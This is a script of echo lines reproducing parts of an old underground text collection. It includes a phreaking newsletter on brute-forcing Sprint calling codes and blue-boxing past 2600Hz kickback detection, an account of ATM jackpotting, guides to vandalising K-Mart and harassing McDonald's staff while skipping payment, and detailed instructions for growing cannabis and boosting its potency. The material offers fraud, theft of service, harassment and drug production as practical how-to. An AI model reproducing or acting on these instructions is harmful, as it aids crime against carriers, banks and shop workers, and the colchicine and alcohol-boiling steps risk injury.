echo And that's it You now know how to hypnotize yourself and someone else.
echo You will learn more and more as you experiment.

echo 67. The Remote Informer Issue #1 by Tracker and Noman Bates
echo Introduction
echo Welcome to the first issue of 'The Remote Informer' This newsletter is reader supported. If the readers of this newsletter do not help support 
echo it, then it will end. We are putting this out to help out the ones that would like to read it. If you are one of those who thinks they know 
echo everything, then don't bother reading it. This newsletter is not anything like the future issues. The future issues will contain several sections, 
echo as long as reader input is obtained. Below is an outline overview of the sections in the future issues.
echo I/O Board (Input/Output Board)
echo The I/O Board is for questions you have, that we might be able to answer or at least refer you to someone or something. We will be honest if 
echo we cannot help you. We will not make up something, or to the effect, just to make it look like we answered you. There will be a section in the 
echo I/O Board for questions we cannot answer, and then the readers will have the opportunity to answer it. We will print anything that is 
echo reasonable in the newsletter, even complaints if you feel like you are better than everyone.
echo NewsCenter
echo This section will be for news around the underworld. It will talk of busts of people in the underworld and anything else that would be 
echo considered news. If you find articles in the paper, or something happens in your local area, type it up, and upload it to one of the boards listed 
echo at the end of the newsletter. Your handle will be placed in the article. If you do enter a news article, please state the date and from where you 
echo got it.
echo Feature Section
echo The Feature Section will be the largest of the sections as it will be on the topic that is featured in that issue. This will be largely reader input 
echo which will be sent in between issues. At the end of the issue at hand, it will tell the topic of the next issue, therefore, if you have something to 
echo contribute, then you will have ample time to prepare your article.
echo Hardware/Software Review
echo In this section, we will review the good and bad points of hardware and software related to the underworld. It will be an extensive review, 
echo rather than just a small paragraph.
echo The Tops
echo This section will be the area where the top underworld BBS's, hacking programs, modem scanners, etc. will be shown. This will be reader 
echo selected and will not be altered in anyway. The topics are listed below.
echo · Underworld BBS's (Hack, Phreak, Card, Anarchy, etc.)
echo · Hacking programs for Hayes compatables
echo · Hacking programs for 1030/Xm301 modems
echo · Modem scanners for Hayes compatables
echo · Modem scanners for 1030/Xm301 modems
echo · Other type illegal programs
echo · You may add topics to the list if enough will support it.
echo Tid Bits
echo This will contain tips and helpful information sent in by the users. If you have any information you wish to contribute, then put it in a text file and 
echo upload it to one of the BBS's listed at the end of the newsletter. Please, no long distance codes, mainframe passwords, etc. We may add other 
echo sections as time goes by. This newsletter will not be put out on a regular basis. It will be put out when we have enough articles and 
echo information to put in it. There may be up to 5 a month, but there will always be at least one a month. We would like you, the readers, to send 
echo us anything you feel would be of interest to others, like hacking hints, methods of hacking long distance companies, companies to card from, 
echo etc. We will maintain the newsletter as long as the readers support it. That is the end of the introduction, but take a look at this newsletter, as it 
echo does contain information that may be of value to you.
echo Hacking Sprint: The Easy Way
echo If you hack US Sprint, 950-0777 (by the way it is no longer GTE Sprint), and you are frustrated at hacking several hours only to find one or two 
echo codes, then follow these tips, and it will increase your results tremendously. First, one thing that Mr. Mojo proved is that Sprint will not store 
echo more than one code in every hundred numbers. (ex: 98765400 to 98765499 may contain only one code). There may NOT be a code in that 
echo hundred, but there will never be more than one. Sprint's 9 digit codes are stored from 500000000 through 999999999. In the beginning of 
echo Sprint's 950 port, they only had 8 digit codes. Then they started converting to 9 digit codes, storing all 8 digit codes between 10000000 and 
echo 49999999 and all 9 digit codes between 500000000 and 999999999. Sprint has since canceled most 8 digit codes, although there are a few 
echo left that have been denoted as test codes. Occasionally, I hear of phreaks saying they have 8 digit codes, but when verifying them, the codes 
echo were invalid. Now, where do you start? You have already narrowed the low and high numbers in half, therefore already increasing your 
echo chances of good results by 50 percent. The next step is to find a good prefix to hack. By the way, a prefix, in hacking terms, is the first digits 
echo in a code that can be any length except the same number of digits the code is. (ex: 123456789 is a code. That means 1, 12, 123, 1234, 12345, 
echo 123456, 1234567, and 12345678 are prefixes) The way you find a good prefix to hack is to manually enter a code prefix. If when you enter 
echo the code prefix and a valid destination number and you do not hear the ringing of the recording telling you that the code is invalid until near the 
echo end of the number, then you know the prefix is valid. Here is a chart to follow when doing this:
echo Code - Destination Range good codes exist
echo -------------------------------------------------
echo 123456789 - 6192R 123400000 - 123499999
echo 123456789 - 619267R 123450000 - 123459999
echo 123456789 - 61926702R 123456000 - 123456999
echo 123456789 - 6192670293R 123456700 - 123456799
echo -------------------------------------------------
echo ( R - Denotes when ring for recording starts)
echo To prove this true, I ran a test using OmniHack 1.3p, written by Jolly Joe. In this test I found a prefix where the last 3 digits were all I had to 
echo hack. I tested each hundred of the 6 digit prefix finding that all but 4 had the ring start after the fourth digit was dialed in the destination 
echo number. The other four did not ring until I had finished the entire code. I set OmniHack to hack the prefix + 00 until prefix + 99. (ex: xxxxxxy00 
echo to xxxxxxy99: where y is one of the four numbers that the ring did not start until the dialing was completed.) Using this method, I found four 
echo codes in a total of 241 attempts using ascending hacking (AKA: Sequential). Below you will see a record of my hack: 
echo Range of hack Codes found Tries
echo xxxxxx300 - xxxxxx399 xxxxxx350 50
echo xxxxxx500 - xxxxxx599 xxxxxx568 68

echo Rumors: Why Spread Them?
echo Do you ever get tired of hearing rumors? You know, someone gets an urge to impress others, so they create a rumor that some long distance 
echo company is now using tracing equipment. Why start rumors? It only scares others out of phreaking, and then makes you, the person who 
echo started the rumor, look like Mr. Big. This article is short, but it should make you aware of the rumors that people spread for personal gain. The 
echo best thing to do is to denote them as a rumor starter and then leave it at that. You should not rag on them constantly, since if the other users 
echo cannot determine if it is fact or rumor, then they should suffer the consequences.
echo The New Sprint FON Calling Cards
echo US Sprint has opened up a new long distance network called the Fiber Optic Network (FON), in which subscribers are given calling cards. 
echo These calling cards are 14 digits, and though, seem randomly generated, they are actually encrypted. The rumors floating around about people 
echo getting caught using the Sprint FON calling cards are fact, not rumors. The reason people are getting caught is that they confuse the FON 
echo calling cards with the local 950 port authorization codes. If you will remember, you never use ATandT calling cards from you home phone. It has 
echo ANI capability, which is not tracing, but rather the originating phone number is placed on the bill as soon as the call is completed. They know 
echo your phone number when you call the 800 access port, but they do not record it until your call is completed. Also, through several of my 
echo hacks, I came up with some interesting information surrounding the new Sprint network. They are listed below.
echo 800-877-0000 - This number is for information on US Sprint's 800 calling card service. I have not played around with it, but I believe it is for 
echo trouble or help with the FON calling cards. I am not sure if it is for subscribing to the FON network.
echo 800-877-0002 - You hear a short tone, then nothing.
echo 800-877-0003 - US Sprint Alpha Test Channel #1
echo 800-877-(0004-0999) - When you call these numbers, you get a recording saying: "Welcome to US Sprint's 1 plus service." When the 
echo recording stops, if you hit the pound key (#) you will get the calling card dial tone.
echo Other related Sprint numbers
echo 800-521-4949 - This is the number that you subscribe to US Sprint with. You may also subscribe to the FON network on this number. It will 
echo take 4 to 5 weeks for your calling card to arrive.
echo 10777 - This is US Sprint's equal access number. When you dial this number, you then dial the number you are calling, and it will be billed 
echo through US Sprint, and you will receive their long distance line for that call. Note that you will be billed for calls made through equal access. Do 
echo not mistake it to be a method of phreaking, unless used from a remote location. If you are in US Sprint's 1+ service then call 1+700-555-1414, 
echo which will tell you which long distance company you are using. When you hear: "Thank you for choosing US Sprint's 1 plus service," hit the 
echo pound key (#), and then you will get the US Sprint dial tone. This however is just the same as if you are calling from your home phone if you 
echo dial direct, so you would be billed for calls made through that, but there are ways to use this to your advantage as in using equal access 
echo through a PBX.
echo Automatic Number Identification (ANI)
echo The true definition for Automatic Number Identification has not been widely known to many. Automatic Number Identification, (AKA: ANI), is the 
echo process of the destination number knowing the originating number, which is where you are calling from. The method of achieving this is to 
echo send the phone number that you are calling from in coded form ahead of the destination number. Below is an example of this.
echo ANI Method
echo Dial: 267-0293
echo Sent: ********2670293
echo * - Denotes the originating number which is coded and sent before the
echo  number
echo As you noticed there are 8 digits in the coded number. This is because, at least I believe, it is stored in a binary-like form. Automatic Number 
echo Identification means a limited future in phreaking. ANI does not threaten phreaking very much yet, but it will in the near future. A new switching 
echo system will soon be installed in most cities that are covered by ESS, Electronic Switching System, now. The system will have ANI capabilities 
echo which will be supplied to the owners of phone lines as an added extra. The owner's phone will have an LED read-out that will show the 
echo phone number of the people that call you. You will be able to block some numbers, so that people cannot call you. This system is in the testing 
echo stages currently, but will soon be installed across most of the country. As you see, this will end a large part of phreaking, until we, the 
echo phreakers, can come up with an alternative. As I have been told by several, usually reliable, people, this system is called ISS, which I am not 
echo sure of the meaning of this, and is being tested currently in Rhode Island. 800 in-watts lines set up by ATandT support ANI. The equipment to 
echo decode an ANI coded origination number does not costs as much as you would expect. 950 ports do not offer ANI capability, no matter what 
echo you have been told. The 950 ports will only give the city in which they are based, this usually being the largest in the state, sometimes the 
echo capitol. One last thing that I should tell you is that ANI is not related to tracing. Tracing can be done on any number whether local, 950, etc. 
echo One way around this, especially when dialing Alliance TeleConferencing, is to dial through several extenders or ports. ANI will only cover the 
echo number that is calling it, and if you call through a number that does not support ANI, then your number will never be known.

echo 68. Jackpotting ATM Machines by The Jolly Roger
echo JACKPOTTING was done rather successfully a while back in (you guessed it) New York. What the culprits did was sever (actually cross 
echo over) the line between the ATM and the host. Insert a microcomputer between the ATM and the host. Insert a fraudulent card into the ATM. (By 
echo card I mean cash card, not hardware.) What the ATM did was: send a signal to the host, saying "Hey Can I give this guy money, or is he 
echo broke, or is his card invalid?" What the microcomputer did was: intercept the signal from the host, discard it, send "there's no one using the 
echo ATM" signal. What the host did was: get the "no one using" signal, send back "okay, then for God's sake don't spit out any money" signal to 
echo ATM. What the microcomputer did was intercept the signal (again), throw it away (again), send "Wow Give him as 
echo much money as he wants. In fact, he's so loaded, give him ALL the cash we have 
echo what else? Obediently dispense cash till the cows came home (or very nearly so). What the crooks got was well in excess of $120,000 (for 
echo one weekend's work), and several years when they were caught. This story was used at a CRYPTOGRAPHY conference I attended a while 
echo ago to demonstrate the need for better information security. The lines between ATM's and their hosts are usually 'weak' in the sense that the 
echo information transmitted on them is generally not encrypted in any way. One of the ways that JACKPOTTING can be defeated is to encrypt the 
echo information passing between the ATM and the host. As long as the key cannot be determined from the ciphertext, the transmission (and hence 
echo the transaction) is secure. A more believable, technically accurate story might concern a person who uses a computer between the ATM and 
echo the host to determine the key before actually fooling the host. As everyone knows, people find cryptanalysis a very exciting and engrossing 
echo subject..don't they? (Hee-Hee)
echo "_____ ______"
echo "| |-<<-| |-<<-| |"
echo "|ATM| micro |Host|"
echo "|___|->>-| |->>-|____|"
echo The B of A ATM's are connected through dedicated lines to a host computer as the Bishop said. However, for maintenance purposes, there is 
echo at least one separate dial-up line also going to that same host computer. This guy basically BS'ed his way over the phone till he found someone 
echo stupid enough to give him the number. After finding that, he had has Apple hack at the code. Simple.
echo Next, he had a friend go to an ATM with any B of A ATM card. He stayed at home with the Apple connected to the host. When his friend 
echo inserted the card, the host displayed it. The guy with the Apple modified the status and number of the card directly in the host's memory. He 
echo turned the card into a security card, used for testing purposes. At that point, the ATM did whatever it's operator told it to do.
echo The next day, he went into the bank with the $2000 he received, talked to the manager and told him every detail of what he'd done. The 
echo manager gave him his business card and told him that he had a job waiting for him when he got out of school.
echo Now, B of A has been warned, they might have changed the system. On the other hand, it'd be awful expensive to do that over the whole 
echo country when only a handful of people have the resources and even less have the intelligence to duplicate the feat. Who knows?

echo 70. Fun at K-Mart by The Jolly Roger
echo Well, first off, one must realize the importance of K-Marts in society today. First off, K-Marts provide things cheaper to those who can't afford 
echo to shop at higher quality stores. Although, all I ever see in there is minorities and Senior Citizens, and the poor people in our city. Personally, I 
echo wouldn't be caught dead in there. But, once, I did. You see, once, after The Moon Roach and Havoc Chaos (Dear friends of mine) and I were 
echo exploring such fun things as rooftops, we came along a K-Mart. Amused, and cold for that matter, we wandered in. The Tension mounts. As 
echo we walked up to the entrance, we were nearly attacked by Youth Groups selling cheap cookies, and wheelchair sticken people selling 
echo American Flags. After laughing at these people, we entered. This is where the real fun begins... First, we wandered around the store, and 
echo turned on all the blue lights we could find. That really distracts and confuses the attendents...Fun to do... The first neat thing, is to go to the 
echo section of the store where they sell computers. Darkness engulfs the earth the day they find Apple Computers being sold there. Instead, 
echo lesser computers like the laughable C-64 can be found there...Turn it on, and make sure nobody's looking...Then, once in Basic, type...
echo ]10 PRINT "Fuck the world" (or something to that effect.)
echo ]20 GOTO 10 and walk away.
echo Also, set the sample radios in the store to a satanic rock station, and turn the radio off. Then, set the alarm for two minutes ahead of the time 
echo displayed there. Turn the volume up all the way, and walk away. After about two minutes, you will see the clerk feebly attempt to turn the 
echo radio down or off. It's really neat to set ten or more radios to different stations, and walk away. One of my favorite things to do, is to get onto 
echo the intercom system of the store. Easier typed then done. First, check out the garden department. You say there's no attendent there? Good. 
echo Sneak carefully over to the phone behind the cheap counter there, and pick it up. Dial the number corresponding to the item that says 'PAGE'... 
echo And talk. You will note that your voice will echo all over the bowels of K-Mart. I would suggest announcing something on the lines of:

echo 72. How to grow Marijuana by The Jolly Roger
echo MARIJUANA
echo Marijuana is a deciduous plant which grows from seeds. The fibrous section of the plant was (has been replaced by synthetics) used to make 
echo rope. The flowering tops, leaves, seeds, and resin of the plant is used by just about everyone to get HIGH. Normally, the vegetable parts of the 
echo plant are smoked to produce this "high," but they can also be eaten. The active ingredient in marijuana resin is THC (Tetahydrocannabinol). 
echo Marijuana contains from 1%-4% THC (4% must be considered GOOD dope). Marijuana grows wild in many parts of the world, and is cultivated 
echo in Mexico, Vietnam, Africa, Nepal, India, South America, etc. The marijuana sold in the United States comes primarily from, yes, the United 
echo States. It is estimated that at least 50% of the grass on the streets in America is homegrown. The next largest bunch comes across the 
echo borders from Mexico, with smaller amounts filtering in from Panama, occasionally South America, and occasionally, Africa. Hashish is the pure 
echo resin of the marijuana plant, which is scraped from the flowering tops of the plant and lumped together. Ganja is the ground-up tops of the 
echo finest plants. (It is also the name given to any sort of marijuana in Jamaica.) Marijuana will deteriorate in about two years if exposed to light, air 
echo or heat. It should always be stored in cool places. Grass prices in the United States are a direct reflection of the laws of supply and demand 
echo (and you thought that high school economics would never be useful). A series of large border busts, a short growing season, a bad crop, any 
echo number of things can drive the price of marijuana up. Demand still seems to be on the increase in the US, so prices seldom fall below last 
echo year's level. Each year a small seasonal drought occurs, as last year's supply runs low, and next year's crop is not up yet. Prices usually rise 
echo about 20%-75% during this time and then fall back to "normal." Unquestionably, a large shortage of grass causes a percentage of smokers to 
echo turn to harder drugs instead. For this reason, no grass control program can ever be beneficial or "successful."
echo GROW IT
echo There is one surefire way of avoiding high prices and the grass DT's: Grow your own. This is not as difficult as some "authorities" on the 
echo subject would make you believe. Marijuana is a weed, and a fairly vivacious one at that, and it will grow almost in spite of you.
echo OUTDOORS
echo Contrary to popular belief, grass grows well in many place on the North American continent. It will flourish even if the temperature does not 
echo raise above 75ø. The plants do need a minimum of eight hours of sunlight per day and should be planted in late April/early May, BUT 
echo DEFINITELY, after the last frost of the year. Growing an outdoor, or "au naturel", crop has been the favored method over the years, because 
echo grass seems to grow better without as much attention when in its natural habitat. Of course, an outdoors setting requires special precautions 
echo not encountered with an indoors crop; you must be able to avoid detection, both from law enforcement freaks and common freaks, both of 
echo whom will take your weed and probably use it. Of course, one will also arrest you. You must also have access to the area to prepare the soil 
echo and harvest the crop. There are two schools of thought about starting the seeds. One says you should start the seedlings for about ten days 
echo in an indoor starter box (see the indoor section) and then transplant. The other theory is that you should just start them in the correct location. 
echo Fewer plants will come up with this method, but there is no shock of transplant to kill some of the seedlings halfway through. The soil should 
echo be prepared for the little devils by turning it over a couple of times and adding about one cup of hydrated lime per square yard of soil and a little 
echo bit (not too much, now) of good water soluble nitrogen fertilizer. The soil should now be watered several times and left to sit about one week. 
echo The plants should be planted at least three feet apart, getting too greedy and stacking them too close will result in stunted plants. The plants like 
echo some water during their growing season, BUT not too much. This is especially true around the roots, as too much water will rot the root 
echo system. Grass grows well in corn or hops, and these plants will help provide some camouflage. It does not grow well with rye, spinach, or 
echo pepperweed. It is probably a good idea to plant in many small, broken patches, as people tend to notice patterns.
echo GENERAL GROWING INFO
echo Both the male and he female plant produce THC resin, although the male is not as strong as the female. In a good crop, the male will still be 
echo plenty smokable and should not be thrown away under any circumstances. Marijuana can reach a height of twenty feet (or would you rather 
echo wish on a star) and obtain a diameter of 4« inches. If normal, it has a sex ratio of about 1:1, but this can be altered in several ways. The male 
echo plant dies in the 12th week of growing, the female will live another 3-5 weeks to produce her younguns. Females can weigh twice as much as 
echo males when they are mature. Marijuana soil should compact when you squeeze it, but should also break apart with a small pressure and 
echo absorb water well. A nice test for either indoor or outdoor growing is to add a bunch of worms to the soil, if they live and hang around, it is 
echo good soil, but if they don't, well, change it. Worms also help keep the soil loose enough for the plants to grow well.
echo SEEDS
echo To get good grass, you should start with the right seeds. A nice starting point is to save the seeds form the best batch you have consumed. 
echo The seeds should be virile, that is, they should not be gray and shriveled up, but green, meaty, and healthy appearing. A nice test is to drop the 
echo seeds on a hot frying pan. If they "CRACK," they are probably good for planting purposes. The seeds should be soaked in distilled water 
echo overnight before planting. BE SURE to plant in the ground with the pointy end UP. Plant about «" deep. Healthy seeds will sprout in about five 
echo days.
echo SPROUTING
echo The best all around sprouting method is probably to make a sprouting box (as sold in nurseries) with a slated bottom or use paper cups with 
echo holes punched in the bottoms. The sprouting soil should be a mixture of humus, soil, and five sand with a bit of organic fertilizer and water 
echo mixed in about one week before planting. When ready to transplant, you must be sure and leave a ball of soil around the roots of each plant. 
echo This whole ball is dropped into a baseball-sized hold in the permanent soil. If you are growing/transplanting indoors, you should use a green 
echo safe light (purchased at nurseries) during the transplanting operation. If you are transplanting outdoors, you should time it about two hours 
echo before sunset to avoid damage to the plant. Always wear cotton gloves when handling the young plants. After the plants are set in the hole, 
echo you should water them. It is also a good idea to use a commercial transplant chemical (also purchased at nurseries) to help then overcome the 
echo shock.
echo INDOOR GROWING
echo Indoor growing has many advantages, besides the apparent fact that it is much harder to have your crop "found," you can control the ambient 
echo conditions just exactly as you want them and get a guaranteed "good" plant. Plants grown indoors will not appear the same as their outdoor 
echo cousins. They will be scrawnier appearing with a weak stems and may even require you to tie them to a growing post to remain upright, BUT 
echo THEY WILL HAVE AS MUCH OR MORE RESIN If growing in a room, you should put tar paper on the floors and then buy sterilized bags of soil 
echo form a nursery. You will need about one cubic foot of soil for each plant. The plants will need about 150 mL. of water per plant/per week. They 
echo will also need fresh air, so the room must be ventilated. (However, the fresh air should contain NO TOBACCO smoke.) At least eight hours of 
echo light a day must be provided. As you increase the light, the plants grow faster and show more females/less males. Sixteen hours of light per 
echo day seems to be the best combination, beyond this makes little or no appreciable difference in the plant quality. Another idea is to interrupt the 
echo night cycle with about one hour of light. This gives you more females. The walls of your growing room should be painted white or covered with 
echo aluminum foil to reflect the light. The lights themselves can be either bulbs of fluorescent. Figure about 75 watts per plant or one plant per two 
echo feet of fluorescent tube. The fluorescents are the best, but do not use "cool white" types. The light sources should be an average of twenty 
echo inches from the plant and NEVER closer than 14 inches. They may be mounted on a rack and moved every few days as the plants grow. The 
echo very best light sources are those made by Sylvania and others especially for growing plants (such as the "gro lux" types).
echo HARVESTING AND DRYING
echo The male plants will be taller and have about five green or yellow sepals, which will split open to fertilize the female plant with pollen. The 
echo female plant is shorter and has a small pistillate flower, which really doesn't look like a flower at all but rather a small bunch of leaves in a 
echo cluster. If you don't want any seeds, just good dope, you should pick the males before they shed their pollen as the female will use some of 
echo her resin to make the seeds. After another three to five weeks, after the males are gone, the females will begin to wither and die (from 
echo loneliness?), this is the time to pick. In some nefarious Middle Eastern countries, farmers reportedly put their beehives next to fields of 
echo marijuana. The little devils collect the grass pollen for their honey, which is supposed to contain a fair dosage of THC. The honey is then 
echo enjoyed by conventional methods or made into ambrosia. If you want seeds - let the males shed his pollen then pick him. Let the female go 
echo another month and pick her. To cure the plants, they must be dried. On large crops, this is accomplished by constructing a drying box or drying 
echo room. You must have a heat source (such as an electric heater) which will make the box/room each 130ø. The box/room must be ventilated to 
echo carry off the water-vapor-laden air and replace it with fresh. A good box can be constructed from an orange crate with fiberglass insulated 
echo walls, vents in the tops, and screen shelves to hold the leaves. There must be a baffle between the leaves and the heat source. A quick cure 
echo for smaller amounts is to: cut the plant at the soil level and wrap it in a cloth so as not to loose any leaves. Take out any seeds by hand and 
echo store. Place all the leaves on a cookie sheet or aluminum foil and put them in the middle shelf of the oven, which is set on "broil." In a few 
echo seconds, the leaves will smoke and curl up, stir them around and give another ten seconds before you take them out.
echo TO INCREASE THE GOOD STUFF
echo There are several tricks to increase the number of females, or the THC content of plants: You can make the plants mature in 36 days if you are 
echo in a hurry, by cutting back on the light to about 14 hours, but the plants will not be as big. You should gradually shorten the light cycle until you 
echo reach fourteen hours. You can stop any watering as the plants begin to bake the resin rise to the flowers. This will increase the resin a bit. 
echo You can use a sunlamp on the plants as they begin to develop flower stalks. You can snip off the flower, right at the spot where it joins the 
echo plant, and a new flower will form in a couple of weeks. This can be repeated two or three times to get several times more flowers than usual.
echo If the plants are sprayed with Ethrel early in their growing stage, they will produce almost all female plants. This usually speeds up the 
echo flowering also, it may happen in as little as two weeks. You can employ a growth changer called colchicine. This is a bit hard to get and 
echo expensive. (Should be ordered through a lab of some sort and costs about $35 a gram.) To use the colchicine, you should prepare your 
echo presoaking solution of distilled water with about 0.10 per cent colchicine. This will cause many of the seeds to die and not germinate, but the 
echo ones that do come up will be polyploid plants. This is the accepted difference between such strains as "gold" and normal grass, and yours will 
echo DEFINITELY be superweed. The problem here is that colchicine is a poison in larger quantities and may be poisonous in the first generation of 
echo plants. Bill Frake, author of CONNOISSEUR'S HANDBOOK OF MARIJUANA runs a very complete colchicine treatment down and warns against 
echo smoking the first generation plants (all succeeding generations will also be polyploid) because of this poisonous quality. However, the Medical 
echo Index shows colchicine being given in very small quantities to people for treatment if various ailments. Although these quantities are small, they 
echo would appear to be larger than any you could receive form smoking a seed-treated plant. It would be a good idea to buy a copy of 
echo CONNOISSEUR'S, if you are planning to attempt this, and read Mr. Drake's complete instructions. Another still-experimental process to increase 
echo the resin it to pinch off the leaf tips as soon as they appear from the time the plant is in the seedling stage on through its entire life-span. This 
echo produces a distorted, wrecked-looking plant which would be very difficult to recognize as marijuana. Of course, there is less substance to this 
echo plant, but such wrecked creatures have been known to produce so much resin that it crystallizes a strong hash all over the surface of the 
echo plant - might be wise to try it on a plant or two and see what happens.
echo PLANT PROBLEM CHART
echo Always check the overall environmental conditions prior to passing judgment - soil around 7 pH or slightly less - plenty of water, light, fresh air, 
echo loose soil, no water standing in pools.
echo SYMPTOM PROBABLY PROBLEM/CURE
echo Larger leaves turning yellow - smaller leaves still green. Nitrogen deficiency - add nitrate of soda or organic fertilizer.
echo Older leaves will curl at edges, turn dark, possibly with a purple cast. Phosphorous 
echo deficiency - add commercial phosphate.
echo Mature leaves develop a yellowish cast to least venial areas. Magnesium deficiency - add commercial fertilizer with a magnesium content.
echo Mature leaves turn yellow and then become spotted with edge areas turning dark gray. Potassium 
echo deficiency - add muriate of potash.
echo Cracked stems, no healthy support tissue. Boron deficiency - add any plant food containing boron.
echo Small wrinkled leaves with yellowish vein systems. Zinc deficiency - add commercial plant food containing zinc.
echo Young leaves become deformed, possibly yellowing. Molybdenum deficiency - use any plant food with a bit of molybdenum in it.
echo EXTRA SECTION: BAD WEED/GOOD WEED
echo Can you turn bad weed into good weed? Surprisingly enough, the answer to this often-asked inquiry is, yes Like most other things in life, the 
echo amount of good you are going to do relates directly to how much effort you are going to put into it. There are no instant, supermarket products 
echo which you can spray on Kansas catnip and have wonderweed, but there are a number of simplified, inexpensive processes (Gee, Mr. 
echo Wizard) which will enhance mediocre grass somewhat, and there are a couple of fairly involved processes which will do up even almostparsley weed into something worth writing home about.
echo EASES
echo 1.Place the dope in a container which allows air to enter in a restricted fashion (such as a can with nail holes punched in its lid) and add a 
echo bunch of dry ice, and the place the whole shebang in the freezer for a few days. This process will add a certain amount of potency to 
echo the product, however, this only works with dry ice, if you use normal, everyday freezer ice, you will end up with a soggy mess...
echo 2.Take a quantity of grass and dampen it, place in a baggy or another socially acceptable container, and store it in a dark, dampish place for a 
echo couple of weeks (burying it also seems to w ork). The grass will develop a mold which tastes a bit harsh, a and burns a tiny bit funny, but 
echo does increase the potency.
echo 3.Expose the grass to the high intensity light of a sunlamp for a full day or so. Personally, I don't feel that this is worth the effort, but if you just 
echo spent $400 of your friend's money for this brick of super-Colombian, right-from-the-President's-personal-stash, and it turns out to be 
echo Missouri weed, and you're packing your bags to leave town before the people arrive for their shares, well, you might at least try it. Can't 
echo hurt.
echo 4.Take the undesirable portions of our stash (stems, seeds, weak weed, worms, etc.) and place them in a covered pot, with enough rubbing 
echo alcohol to cover everything. Now CAREFULLY boil the mixture on an ELECTRIC stove or lab burner. DO NOT USE GAS - the alcohol is too 
echo flammable. After 45 minutes of heat, remove the pot and strain the solids out, SAVING THE ALCOHOL. Now, repeat the process with the 
echo same residuals, but fresh alcohol. When the second boil is over, remove the solids again, combine the two quantities of alcohol and reboil 
echo until you have a syrupy mixture. Now, this syrupy mixture will contain much of the THC formerly hidden in the stems and such. One simply 
echo takes this syrup the thoroughly combines it with the grass that one wishes to improve upon.
echo SPECIAL SECTION ON RELATED SUBJECT MARYGIN
echo Marygin is an anagram of the words marijuana and gin, as in Eli Whitney. It is a plastic tumbler which acts much like a commercial cotton gin. 
echo One takes about one ounce of an herb and breaks it up. This is then placed in the Marygin and the protruding knob is rotated. This action turns 
echo the internal wheel, which separates the grass from the debris (seeds, stems). It does not pulverize the grass as screens have a habit of doing 
echo and is easily washable.

echo 74. How To Terrorize McDonalds by The Jolly Roger
echo Now, although McDonalds is famous for it's advertising and making the whole world think that the BigMac is the best thing to come along since 
echo sliced bread (buns?), each little restaurant is as amateur and simple as a new -found business. Not only are all the employees rather 
echo inexperienced at what they're supposed to do, but they will just loose all control when an emergency occurs....here we go First, get a few 
echo friends (4 is good...I'll get to this later) and enter the McDonalds restaurant, talking loudly and reeking of some strange smell that automatically 
echo makes the old couple sitting by the door leave. If one of those pimply-faced goons is wiping the floor, then track some crap all over it (you could 
echo pretend to slip and break your head, but you might actually do so). Next, before you get the food, find a table. Start yelling and releasing some 
echo strange body odor so anybody would leave their table and walk out the door. Sit two friends there, and go up to the counter with another. Find 
echo a place where the line is short, or if the line is long say "I only wanna buy a coke." and you get moved up. Now, you get to do the ordering 
echo ...heh heh heh. Somebody always must want a plain hamburger with absolutely nothing on it (this takes extra time to make, and drives the little 
echo hamburger-makers insane)..order a 9-pack of chicken McNuggets...no, a 20 pack...no, three 6 packs...wait...go back to the table and ask who 
echo wants what. Your other friend waits by the counter and makes a pass at the female clerk. Get back to the thing and order three 6-packs of 
echo chicken etc....now she says "What kind of sauce would you like?". Of course, say that you all want barbecue sauce one of your friends 
echo wants 2 (only if there are only 2 containers of barbecue sauce left). Then they hafta go into the storeroom and open up another box. Finally, 
echo the drinks...somebody wants coke, somebody root beer, and somebody diet coke. After these are delivered, bring them back and say "I didn't 
echo order a diet coke" This gets them mad; better yet, turn down something terrible that nobody wants to drink, so they hafta 
echo throw the drink away; they can't sell it. After all the food(?) is handed to you, you must never have enough money to pay. The clerk will be so 
echo angry and confused that she'll let you get away with it (another influence on her is your friend asking her "If you let us go, I'll go out with you." 
echo and giving her a fake fone number). Now, back to your table. But first, somebody likes ketchup and mustard. And plenty (too much) of napkins. 
echo Oh, and somebody likes forks and knives, so always end up breaking the ones you pick outta the box. Have your friends yell out, “Yay We 
echo have munchies" As loud as they can. That'll worry the entire restaurant. Proceed to sit down. So, you are sitting in the smoking section (by 
echo accident) eh? Well, while one of the tobacco-breathers isn't looking, put a sign from the other side of the room saying "Do not smoke here" and 
echo he'll hafta move...then he goes into the real non-smoking section, and gets yelled at. He then thinks that no smoking is allowed in the restaurant, 
echo so he eats outside (in the pouring rain) after your meal is finished (and quite a few splattered-opened ketchup packets are all over your table), 
echo try to leave. But oops Somebody has to do his duty in the men's room. As he goes there, he sticks an uneaten hamburger (would you dare to 
echo eat one of their hamburgers?) Inside the toilet, flushes it a while, until it runs all over the bathroom. Oops Send a pimply-faced teenager to 
echo clean it up. (He won't know that brown thing is a hamburger, and he'll get sick. Wheee) As you leave the restaurant, looking back at your 
echo uncleaned table, somebody must remember that they left their chocolate shake there He takes it then says "This 
echo tastes like crap He missed, and now the same poor soul who's cleaning 
echo up the bathroom now hasta clean up chocolate shake. Then leave the joint, reversing the "Yes, we're open" sign (as a reminder of your visit) 
echo There you have it You have just put all of McDonalds into complete mayhem. And since there is no penalty for littering in a restaurant, bugging 
echo people in a public eatery (or throw -upery, in this case) you get off scot-free. Wasn't that fun?

echo 76. The Myth of the 2600hz Detector by The Jolly Roger
echo Just about everyone I talk to these days about ESS seems to be scared witless about the 2600hz detector. I don't know who thought this one 
echo up, but it simply does not exist. So many of you people whine about this so-called phreak catching device for no reason. Someone with ATandT 
echo said they had it to catch phreakers. This was just to scare the blue-boxers enough to make them quit boxing free calls. I'm not saying ESS is 
echo without its hang-ups, either. One thing that ESS can detect readily is the kick-back that the trunk circuitry sends back to the ESS machine when 
echo your little 2600hz tone resets the toll trunk. After an ESS detects a kickback it turns an M-F detector on and records any M-F tones transmitted.
echo Defeating the kick-back detector
echo As mentioned in my previous note, kick-back detection can be a serious nuisance to anyone interested in gaining control of a trunk line. The 
echo easiest way to by -pass this detection circuitry is not really by-passing it at all, it is just letting the kick-back get detected on some other line. 
echo This other line is your local MCI, sprint, or other long distance carrier (except ATandT). The only catch is that the service you use must not 
echo disconnect the line when you hit the 2600hz tone. This is how you do it: call up your local extender, put in the code, and dial a number in the 
echo 601 area code and the 644 exchange. Lots of other exchanges work across the country, I'm sure, but this is the only one that I have found so 
echo far. Anyway, when it starts ringing, simply hit 2600Hz and you'll hear the kick-back, (ka-chirp, or whatever). Then you are ready to dial 
echo whoever you want (conferences, inward, route and rate, overseas, etc.) From the trunk line in operator tones Since blowing 2600Hz doesn't 
echo make you a phreaker until the toll equipment resets the line, kickback detection is the method ATandT chooses (for now) this information comes 
echo as a result of my experiments and experience and has been verified by local ATandT employees I have as acquaintances. They could only say that 
